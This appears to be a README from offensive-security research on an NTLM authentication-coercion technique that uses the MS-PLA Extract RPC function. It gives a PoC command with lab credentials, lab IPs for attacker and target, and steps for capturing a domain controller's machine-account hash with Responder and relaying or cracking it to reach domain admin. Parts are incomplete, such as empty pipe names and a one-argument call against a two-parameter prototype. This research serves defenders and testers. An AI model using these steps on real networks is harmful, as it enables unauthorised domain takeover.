# MS-PLA - Remote call to Extract (opnum 31)

## Summary

 - **Protocol**: [[MS-PLA]: Performance Logs and Alerts Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pla/d752a77f-442f-4e38-8a40-4b5258e83700)

 - **Protocol UUID**: 03837520-098b-11d8-9414-505054503030

 - **Protocol version**: 0.0

 - **SMB Named pipe**: ``

 - **Function name**: [`Extract`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pla/e0fbbb46-286e-4d68-bd3b-a84238f80e1a)

 - **Function operation number**: `31`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-PLA`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pla/d752a77f-442f-4e38-8a40-4b5258e83700) protocol (with uuid `03837520-098b-11d8-9414-505054503030` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-PLA`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pla/d752a77f-442f-4e38-8a40-4b5258e83700) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-PLA]: Performance Logs and Alerts Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pla/d752a77f-442f-4e38-8a40-4b5258e83700) and allows to call RPC functions of this protocol. We will then call the remote [`Extract`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pla/e0fbbb46-286e-4d68-bd3b-a84238f80e1a) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
Extract('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
HRESULT Extract(
   [in] BSTR CabFilename,
   [in] BSTR DestinationPath
 );
```

## References

 - Documentation of protocol [MS-PLA]: Performance Logs and Alerts Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pla/d752a77f-442f-4e38-8a40-4b5258e83700

 - Documentation of function `Extract`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pla/e0fbbb46-286e-4d68-bd3b-a84238f80e1a